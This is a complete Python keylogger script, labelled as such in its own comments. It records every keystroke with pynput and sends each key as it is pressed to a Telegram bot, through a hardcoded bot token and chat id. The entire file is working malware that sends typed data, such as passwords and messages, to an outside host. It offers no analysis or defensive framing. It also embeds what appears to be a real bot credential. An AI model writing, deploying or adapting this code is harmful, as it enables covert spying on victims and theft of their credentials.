from pynput import keyboard
import requests
bot_token = '5830637505:AAG3Y8KkX4Yb0VGxSR3UKJ39ZOFIIZw8KL0'
chat_id = '820786160'
def on_press(key):
    try:
        key_char = key.char
        data = {
            'chat_id': chat_id,
            'text': key_char,
        }
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', params=data)
    except AttributeError:
        # Special key encountered, add it to the log file
        key_name = str(key).replace("Key.", "<") + ">"
        data = {
            'chat_id': chat_id,
            'text': key_name,
        }
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', params=data)


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
